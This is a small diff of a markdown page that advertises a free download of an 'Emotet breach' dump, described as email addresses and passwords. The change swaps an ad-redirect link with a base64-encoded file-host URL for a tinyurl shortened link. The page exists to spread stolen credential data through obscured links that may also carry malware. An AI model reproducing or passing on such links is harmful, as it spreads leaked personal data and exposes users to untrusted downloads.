@@ -12,4 +12,4 @@ Email addresses, Passwords
 
 ## Free download Link
 
-[Emotet breach Free Download Link](https://link-to.net/1229997/633.9740368772524/dynamic/?r=aHR0cHM6Ly93d3cubWVkaWFmaXJlLmNvbS92aWV3L2JnTHJMTTFGNnlibmJBVS8vZmlsZQ==)
+[Emotet breach Free Download Link](https://tinyurl.com/2b2k277t)
